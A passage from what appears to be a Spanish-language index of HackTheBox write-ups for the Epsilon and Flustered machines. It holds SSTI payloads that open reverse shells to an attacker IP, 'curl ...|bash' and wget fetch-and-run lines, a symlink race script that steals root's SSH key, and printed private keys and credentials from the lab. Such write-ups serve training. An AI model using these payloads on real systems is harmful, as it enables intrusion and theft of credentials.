, \"CodeSha256\" : \"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=\" , \"Version\" : \" $LATEST \" , \"VpcConfig\" : {} , \"TracingConfig\" : { \"Mode\" : \"PassThrough\" } , \"RevisionId\" : \"969dca3e-3a03-45bd-a4dd-6af102253cc5\" , \"State\" : \"Active\" , \"LastUpdateStatus\" : \"Successful\" , \"PackageType\" : \"Zip\" } , \"Code\" : { \"Location\" : \"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code\" } , \"Tags\" : {} } # Se descarga el c\u00f3digo de la funci\u00f3n, tener en cuenta que viene zipeado: > curl 'http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code' --output codigo.zip > unzip codigo.zip Archive: codigo inflating: lambda_function.py # Se obtiene el secret: > catn lambda_function.py import json secret = 'RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124 '''Beta release for tracking''' def lambda_handler ( event, context ) : try: id = event [ 'queryStringParameters' ][ 'order_id' ] if id: return { 'statusCode' : 200 , 'body' : json.dumps ( str ( resp )) #dynamodb tracking for CR-342 } else : return { 'statusCode' : 500 , 'body' : json.dumps ( 'Invalid Order ID' ) } except: return { 'statusCode' : 500 , 'body' : json.dumps ( 'Invalid Order ID' ) } # Con python3 generamos un jwt v\u00e1lido: >>> import jwt >>> encoded_jwt = jwt . encode ({ 'username' : 'admin' }, 'RrXCv`mrNe!K!4+5`wYq' , algorithm = 'HS256' ) >>> print ( encoded_jwt ) b 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg' Se adjunta el token a la p\u00e1quina que no teniamos autorizaci\u00f3n","title":"Hacking AWS - LAMBDA"},{"location":"maquinas/linux/epsilon/#ssti-server-side-template-injection","text":"El par\u00e1metro custome es vulnerable a SSTI: Se adjunta el token a la p\u00e1quina que no teniamos autorizaci\u00f3n # Payload: costume ={ % for x in () .__class__.__base__.__subclasses__ () % }{ % if \"warning\" in x.__name__ % }{{ x () ._module.__builtins__ [ '__import__' ]( 'os' ) .popen ( \"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"/home/tom/user.txt\\\"]);'\" ) .read () .zfill ( 417 )}}{ %endif% }{ % endfor % } & q = cccc & addr = cccc RCE - Forma de ejecutar una shell reversa: # Descarga de script para ejecutar reverse shell (/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.16/4443 0>&1') (nc -lvnp 4443 [para recibir la salida]) (python -m http.server 80 [servidor web con el script]) costume ={ % for x in () .__class__.__base__.__subclasses__ () % }{ % if \"warning\" in x.__name__ % }{{ x () ._module.__builtins__ [ '__import__' ]( 'os' ) .popen ( \"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/usr/bin/wget\\\", \\\"http://10.10.14.16/xshell.sh\\\"]);'\" ) .read () .zfill ( 417 )}}{ %endif% }{ % endfor % } & q = cccc & addr = cccc # Servidor python http en el puerto 80 y ejecucion de reverse shell (nc -lvnp 4443) costume ={ % for x in () .__class__.__base__.__subclasses__ () % }{ % if \"warning\" in x.__name__ % }{{ x () ._module.__builtins__ [ '__import__' ]( 'os' ) .popen ( \"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\", \\\"xshell.sh\\\"]);'\" ) .read () .zfill ( 417 )}}{ %endif% }{ % endfor % } & q = cccc & addr = cccc RCE Alternativa - M\u00e1s simplificada: {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen ( 'id' ) .read () }} {{ self._TemplateReference__context.namespace.__init__.__globals__.os.system ( 'curl 10.10.14.15|bash' ) .read () }}","title":"SSTI (Server Side Template Injection)"},{"location":"maquinas/linux/epsilon/#escalate-privileges","text":"Monitorizando procesos con pspy64 se localiza un script que ciclicamente se ejecuta cada cierto tiempo con permisos de root: tom@epsilon:/tmp/var/www$ cat /usr/bin/backup.sh #!/bin/bash file = ` date +%N ` /usr/bin/rm -rf /opt/backups/* /usr/bin/tar -cvf \"/opt/backups/ $file .tar\" /var/www/app/ sha1sum \"/opt/backups/ $file .tar\" | cut -d ' ' -f1 > /opt/backups/checksum sleep 5 check_file = ` date +%N ` /usr/bin/tar -chvf \"/var/backups/web_backups/ ${ check_file } .tar\" /opt/backups/checksum \"/opt/backups/ $file .tar\" /usr/bin/rm -rf /opt/backups/* Exploit: tom@epsilon:/tmp$ cat escalador.sh #!/bin/bash while true ; do if [ -e /opt/backups/checksum ] ; then echo \"[!] Mostrando backups actuales\" ls -la /var/backups/web_backups/ echo \"[!] Borrando archivo checksum\" rm -f /opt/backups/checksum echo \"[!] Creando link simbolico a id_rsa de root\" ln -sf /root/.ssh/id_rsa /opt/backups/checksum echo \"[!] En 6 segundos vamos a revisar los \u00faltimos backups\" sleep 6 ls -la /var/backups/web_backups/ echo \"[!] Copia el \u00faltimo tiene sorpresa\" fi done tom@epsilon:/tmp$ bash explotado.sh [ ! ] Mostrando backups actuales total 2948 drwxr-xr-x 2 root root 4096 Sep 2 19 :17 . drwxr-xr-x 3 root root 4096 Feb 4 2022 .. -rw-r--r-- 1 root root 1003520 Sep 2 19 :15 002433377 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :16 027571548 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :17 063984736 .tar [ ! ] Borrando archivo checksum [ ! ] Creando link simbolico a id_rsa de root [ ! ] En 6 segundos vamos a revisar los \u00faltimos backups total 3928 drwxr-xr-x 2 root root 4096 Sep 2 19 :18 . drwxr-xr-x 3 root root 4096 Feb 4 2022 .. -rw-r--r-- 1 root root 1003520 Sep 2 19 :15 002433377 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :16 027571548 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :17 063984736 .tar -rw-r--r-- 1 root root 1003520 Sep 2 19 :18 109662329 .tar [ ! ] Copia el \u00faltimo tiene sorpresa tom@epsilon:/tmp$ cp /var/backups/web_backups/109662329.tar . tom@epsilon:/tmp$ tar xvf 109662329 .tar opt/backups/checksum opt/backups/090647821.tar tom@epsilon:/tmp$ cat opt/backups/checksum -----BEGIN OPENSSH PRIVATE KEY----- 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 == -----END OPENSSH PRIVATE KEY----- tom@epsilon:/tmp/opt/backups$ chmod 600 checksum tom@epsilon:/tmp/opt/backups$ ssh root@localhost -i checksum root@epsilon:~# cat /root/root.txt c2c9bb669159cbdabb8d2ee4f2e377df","title":"Escalate privileges"},{"location":"maquinas/linux/flustered/","text":"Flustered HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.131 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.131 Se realiza un scan de los puertos abiertos y se a\u00f1ade el dominio encontrado a hosts: nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 18:41 CEST Nmap scan report for steampunk-era.htb (10.10.11.131) Host is up (0.037s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA) | 256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA) |_ 256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519) 80/tcp open http nginx 1.14.2 |_http-title: steampunk-era.htb - Coming Soon |_http-server-header: nginx/1.14.2 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind 3128/tcp open http-proxy Squid http proxy 4.6 |_http-title: ERROR: The requested URL could not be retrieved |_http-server-header: squid/4.6 24007/tcp open rpcbind 49152/tcp open ssl/unknown | ssl-cert: Subject: commonName=flustered.htb | Not valid before: 2021-11-25T15:27:31 |_Not valid after: 2089-12-13T15:27:31 |_ssl-date: TLS randomness does not represent time 49153/tcp open rpcbind En el puerto 24007 se encuentra el servicio gluster: > apt install glusterfs-server Leyendo lista de paquetes... Hecho Creando \u00e1rbol de dependencias... Hecho Leyendo la informaci\u00f3n de estado... Hecho glusterfs-server ya est\u00e1 en su versi\u00f3n m\u00e1s reciente ( 9 .2-1 ) . Los paquetes indicados a continuaci\u00f3n se instalaron de forma autom\u00e1tica y ya no son necesarios. libindicator3-7 linux-compiler-gcc-11-x86 linux-headers-5.16.0-12parrot1-common linux-kbuild-5.16 Utilice \u00abapt autoremove\u00bb para eliminarlos. 0 actualizados, 0 nuevos se instalar\u00e1n, 0 para eliminar y 4 no actualizados. > apt install glusterfs-client Leyendo lista de paquetes... Hecho Creando \u00e1rbol de dependencias... Hecho Leyendo la informaci\u00f3n de estado... Hecho glusterfs-client ya est\u00e1 en su versi\u00f3n m\u00e1s reciente ( 9 .2-1 ) . Los paquetes indicados a continuaci\u00f3n se instalaron de forma autom\u00e1tica y ya no son necesarios. libindicator3-7 linux-compiler-gcc-11-x86 linux-headers-5.16.0-12parrot1-common linux-kbuild-5.16 Utilice \u00abapt autoremove\u00bb para eliminarlos. 0 actualizados, 0 nuevos se instalar\u00e1n, 0 para eliminar y 4 no actualizados. > gluster --remote-host = 10 .10.11.131 volume list vol1 vol2 > mount.glusterfs flustered.htb:/vol1 /home/x/Documentos/htb/flustered/puntodemontaje Mount failed. Check the log file for more details. # Miramos los logs y vemos un problema de que no resuelve flustered, por lo cual lo agregamos al fichero hosts: > cat /var/log/glusterfs/home-x-Documentos-htb-flustered-puntodemontaje.log | grep fail [ 2022 -09-03 18 :24:49.784146 +0000 ] E [ name.c:264:af_inet_client_get_remote_sockaddr ] 0 -vol2-client-0: DNS resolution failed on host flustered [ 2022 -09-03 18 :24:49.790468 +0000 ] E [ fuse-bridge.c:5362:fuse_first_lookup ] 0 -fuse: first lookup on root failed ( Transport endpoint is not connected ) # La siguiente vez que lo corremos para montar el vol1 da otro error de certificados, de los cuales no disponemos: > cat /var/log/glusterfs/home-x-Documentos-htb-flustered-puntodemontaje.log | grep ssl 8 : option transport.socket.ssl-enabled off 8 : option transport.socket.ssl-enabled off [ 2022 -09-03 18 :33:32.282587 +0000 ] I [ socket.c:4279:ssl_setup_connection_params ] 0 -vol1-client-0: SSL support for MGMT is NOT enabled IO path is ENABLED certificate depth is 1 for peer [ 2022 -09-03 18 :33:32.283217 +0000 ] E [ socket.c:4397:ssl_setup_connection_params ] 0 -vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pem # Se procede a montar el vol2: > mount.glusterfs flustered.htb:/vol2 /home/x/Documentos/htb/flustered/puntodemontaje # De este modo obtenemos los credenciales de Squid Proxy: > pwd /home/x/Documentos/htb/flustered/puntodemontaje/squid > strings passwd.ibd infimum supremum lance.friedman ( user ) o>WJ5-jD< 5 ^m3 ( passwd ) Lance Friedman Squid Proxy Configuration: Ya se puede configurar el Squid Proxy para revisar esa parte: # Acceso a Squid Proxy desde curl: > curl -v -s --proxy 'http://10.10.11.131:3128' -U 'lance.friedman:o>WJ5-jD<5^m3' http://10.10.11.131/ # Variante: > curl -v -s --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128' 10 .10.11.131 # Acceso con Proxychains: > tail /etc/proxychains.conf # add proxy here ... #socks5 127.0.0.1 1080 http 10 .10.11.131 3128 lance.friedman o>WJ5-jD< 5 ^m3 #http 127.0.0.1 8080 > proxychains curl -s 10 .10.11.131 [ proxychains ] config file found: /etc/proxychains.conf [ proxychains ] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [ proxychains ] DLL init: proxychains-ng 4 .14 [ proxychains ] Strict chain ... 10 .10.11.131:3128 ... 10 .10.11.131:80 ... OK <html> <head> <title>steampunk-era.htb - Coming Soon</title> </head> <body style = \"background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;\" > </body> </html> # Fuzzing con FFUF (Hay que urlencodear algunos chars \"man ascii\") > ffuf -replay-proxy \"http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/FUZZ # Unicamente me ha funcionado bien con Gobuster: gobuster dir --proxy \"http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1 /app ( Status: 301 ) [ Size: 185 ] [ --> http://127.0.0.1/app/ ] SSTI (Server Site Template Injection) => Reverse Shell Fuzzeando se encuentra c\u00f3digo en python: gobuster dir --proxy \"http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py,php WJ5-jDDocumentos/htb/flustered5m3@10.10.11.131:3128 \" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py,php - Parrot Terminal=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://127.0.0.1/app [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Proxy: http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128 [+] User Agent: gobuster/3.1.0 [+] Extensions: py,php [+] Timeout: 10s =============================================================== 2022/09/03 22:54:28 Starting gobuster in directory enumeration mode =============================================================== /templates (Status: 301) [Size: 185] [--> http://127.0.0.1/app/templates/] /static (Status: 301) [Size: 185] [--> http://127.0.0.1/app/static/] /app.py (Status: 200) [Size: 748] /config (Status: 301) [Size: 185] [--> http://127.0.0.1/app/config/] Revisando el c\u00f3digo python que contiene la librer\u00eda flask se puede observar que es vulnerable a inyecci\u00f3n de c\u00f3digo en def getsiteurl ( config ): if config and \"siteurl\" in config : return config [ \"siteurl\" ] else : return \"steampunk-era.htb\" @app . route ( \"/\" , methods = [ 'GET' , 'POST' ]) def index_page (): # Will replace this with a proper file when the site is ready config = request . json template = f ''' <html> <head> <title> { getsiteurl ( config ) } - Coming Soon</title> </head> <body style=\"background-image: url(' { url_for ( 'static' , filename = 'steampunk-3006650_1280.webp' ) } ');background-size: 100%;background-repeat: no-repeat;\"> </body> </html> ''' return render_template_string ( template ) if __name__ == \"__main__\" : app . run () SSTI (Server Side Template Injection) SSTI RCE GET / HTTP/1.1 Host: flustered.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 21 Content-Type: application/json {\"siteurl\":\"{{5*5}}\"} El par\u00e1metro custome es vulnerable a SSTI: Se adjunta el token a la p\u00e1quina que no teniamos autorizaci\u00f3n # Payload que ejecuta un ls: \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\" RCE - Forma de ejecutar una shell reversa: echo 'bash -c \"bash -i >& /dev/tcp/10.10.14.16/4443 0>&1\"' | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg == # Payload para ganar acceso a la m\u00e1quina v\u00edctima: Content-Type: application/json { \"siteurl\" : \"{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg==| base64 -d | bash').read()}}\" } Escalate privileges Una vez dentro de la m\u00e1quina se copian los certificados que nos faltaban antes para montar el vol1: > ls -la /etc/ssl drwxr-xr-x root root 122 B Sun Sep 4 01 :44:07 2022 \uf115 . drwxr-xr-x root root 6 .3 KB Sat Sep 3 21 :03:55 2022 \uf115 .. drwxr-xr-x root root 10 KB Wed Jul 7 20 :55:00 2021 \uf115 certs drwx--x--- root ssl-cert 42 B Wed Jul 7 20 :55:00 2021 \uf115 private .rw-r--r-- root root 4 .0 KB Sun Sep 4 01 :44:06 2022 \uf016 glusterfs.ca .rw-r--r-- root root 3 .2 KB Sun Sep 4 01 :42:47 2022 \uf016 glusterfs.key .rw-r--r-- root root 1 .8 KB Sun Sep 4 01 :41:12 2022 \uf016 glusterfs.pem .rw-r--r-- root root 11 KB Thu Mar 25 21 :49:34 2021 \uf016 openssl.cnf > mount.glusterfs flustered.htb:/vol1 /home/x/Documentos/htb/flustered/puntodemontaje > ls -la drwxr-x--- x docker 4 .0 KB Mon Oct 25 07 :49:56 2021 \uf115 . drwxr-xr-x root root 170 B Sat Sep 3 23 :20:12 2022 \uf115 .. drwx------ x docker 4 .0 KB Mon Oct 25 07 :44:58 2021 \uf115 .gnupg drwx------ x docker 4 .0 KB Tue Dec 7 20 :54:21 2021 \uf115 .ssh lrwxrwxrwx x docker 9 B Thu Oct 28 08 :59:15 2021 \uf481 .bash_history \u21d2 /dev/null .rw-r--r-- x docker 220 B Mon Sep 20 14 :27:59 2021 \uf016 .bash_logout .rw-r--r-- x docker 3 .4 KB Mon Sep 20 14 :27:59 2021 \uf489 .bashrc .rw-r--r-- x docker 807 B Mon Sep 20 14 :27:59 2021 \uf016 .profile .r-------- x docker 33 B Sat Sep 3 14 :29:46 2022 \uf15c user.txt > catn user.txt 86af85b760eb29b5b87c1e0d79508480 # Mirando el home de la m\u00e1quina comprometida se observa que solo existe el usuario jennifer. # Se deduce que el punto de montaje de vol1 es un directorio compartido de su home, por lo cual se genera un par de claves ssh y se introduce la publica dentro del authorized_keys ssh-keygen -f jennifer cat jennifer.pub > authorized_keys # Se copia la clave privada a la m\u00e1quina v\u00edctima y se accede por ssh a localhost con el usuario jennifer ssh jennifer@localhost -i /dev/shm/id_rsa_jennifer ( funcionar\u00eda desde la m\u00e1quina de atacante ya que es el mismo objetivo ) Escalada a root A trav\u00e9s de scripts de enumeraci\u00f3n se encuentra un contenedor con un puerto abierto: #!/bin/bash for i in $( seq 1 254 ) ; do timeout 1 ping -c 1 172 .17.0. $i & >/dev/null && echo \"[!] arriba $i \" & done ; wait #!/bin/bash for port in $( seq 1 65535 ) ; do timeout 1 bash -c \"echo '' > /dev/tcp/172.17.0.2/ $port \" 2 >/dev/null && echo \"[+] puerto $port abierto\" & done ; wait Creamos un local port forwarding con ssh para tener mayor control: > ssh -L 10000 :172.17.0.2:10000 jennifer@10.10.11.131 -i jennifer # Es un servicio de Azure que se gestiona a trav\u00e9s > nmap -sCV -p10000 localhost Starting Nmap 7 .92 ( https://nmap.org ) at 2022 -09-04 03 :24 CEST Nmap scan report for localhost ( 127 .0.0.1 ) Host is up ( 0 .000084s latency ) . Other addresses for localhost ( not scanned ) : ::1 PORT STATE SERVICE VERSION 10000 /tcp open snet-sensor-mgmt? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: | HTTP/1.1 400 Bad Request | Connection: close | FourOhFourRequest: | HTTP/1.1 500 Internal Server Error | Server: Azurite-Blob/3.14.3 | Date: Sun, 04 Sep 2022 01 :24:57 GMT | Connection: close | GetRequest: | HTTP/1.1 500 Internal Server Error | Server: Azurite-Blob/3.14.3 | Date: Sun, 04 Sep 2022 01 :24:51 GMT | Connection: close > apt update > apt install snapd > snap install storage-explorer > storage-explorer ( el programa me deja iniciarlo con un usuario no root ) # Tras iniciarlo se adjunta un recurso y se selecciona Emulador de almacenamiento local, y usamos el usuario jennifer y la key de la m\u00e1quina v\u00edctima: jennifer@flustered:/tmp$ cat /var/backups/key FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ == # Solo me ha funcionado con la version 1.22.1, lo mejor es usarlo desde Windows # Root id_rsa: -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAvrfifWpWEAtxdHG7wTIqLGYPJo3TJ/+HzrrYHyzDBADpNEl2U+vi NYW2N69F6n0Yjd7XZox69xb4AG0FOe6/SEXi+e960L023luJ7UUaJUxravi4BqAPabiZ5Q D0kT7hX+MTyVLPKqzs+AbPTzY2GOxUNMAE1wbmV9kl4P28dU7tkNKa2eXBm6GY+tQosz/j 5MAuF5Nq7WQ26ngBfQHSwUkC5+FCzD5yA1NnvcGIuKu0SK0J+jPSp50tY8yTkF72IuTRsM Lvo9dkqyzAa1QoHxkLtm8lptX62BEIlnxYA2zUntlj0g6/G/OMKwkosTvJTK0fdMrloiQn jjnoNvikGwAAA8jGJr9zxia/cwAAAAdzc2gtcnNhAAABAQC+t+J9alYQC3F0cbvBMiosZg 8mjdMn/4fOutgfLMMEAOk0SXZT6+I1hbY3r0XqfRiN3tdmjHr3FvgAbQU57r9IReL573rQ vTbeW4ntRRolTGtq+LgGoA9puJnlAPSRPuFf4xPJUs8qrOz4Bs9PNjYY7FQ0wATXBuZX2S Xg/bx1Tu2Q0prZ5cGboZj61CizP+PkwC4Xk2rtZDbqeAF9AdLBSQLn4ULMPnIDU2e9wYi4 q7RIrQn6M9KnnS1jzJOQXvYi5NGwwu+j12SrLMBrVCgfGQu2byWm1frYEQiWfFgDbNSe2W PSDr8b84wrCSixO8lMrR90yuWiJCeOOeg2+KQbAAAAAwEAAQAAAQEAqqr1dJPu9ia3XaPV h9qzYM3n6vFpr1Z9GqObebJdxbxm9FJ1ID5rTMgeOxCPOXq+uV5cVbmK5IjaX88vqRscc7 mOl2kV96wLaMpz0C9RaWVMjwqJ6+vaPxpiJUtIkJ27o0oaz8NZ/m+HE6FMbS8vE/iQli/r ZN0Yzi5VNlT6C+KKX9GBD8j4xIC6Gs1bblVmWz71V9JkfpFRdBAlk7/MHLNhg7rdHywo27 H0XBvjpbBVbEpLykvHxNb4Ik5TQ5RGioPU2SftgDyy94oksDpM6u1uj7gBQbnPZn7jzMG7 6bj54dlyf5bvL2q/Jq63tQw6KGbcAcbpsSwmn53e0CaXqQAAAIEA0JIB140zTamK2c5L9K gBeRXKZKZ4UtvVtZPKIdlbflUFheDNwj5FtCMICFOLV+cyBQcwJJv135lj8A6OAbz4z9mT dw+4aCnnAZactRHECxxjaPVr9qpN9CDFFyPDa5izQ/oqUQMdgztEJxjHFrWzGy5QHExKpB cWv9mhSs3E4GMAAACBAPlANmPbMgfKQEh4tya3sPvUIxvy46pX8GcAvNK++bGU195oY7a6 3w7L62mge95O8zjUOvNoCmBs4dpPKXLOdpk3XpRZSm90Wgxe85xMBHhW2kwIBfqPHUiZj+ A5jKEYSTWjFQfHEVrIbUTAJ7dixtuKLdATxdgYiuzxS/AmSPhvAAAAgQDD4e3lJMh1KVop a7xdCR3xhXCQ7Jm7u/4f5txWS4DEuRVUmvQ3pqqg72nX27vCmPN6/moidXnxVqJ06K/40l KMQG/hRwUGBMxPBVec5O63H5FBd9g3cVUSMA4Fwy6hUWjYMXcNVwugogkW/T0XLUp/w+X/ TGdaVjEDWhNuypttFQAAAA5yb290QGZsdXN0ZXJlZAECAw == -----END OPENSSH PRIVATE KEY-----","title":"Flustered"},{"location":"maquinas/linux/flustered/#flustered-htb","text":"","title":"Flustered HTB"},{"location":"maquinas/linux/flustered/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.11.131","title":"Recon"},{"location":"maquinas/linux/flustered/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.131 Se realiza un scan de los puertos abiertos y se a\u00f1ade el dominio encontrado a hosts: nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 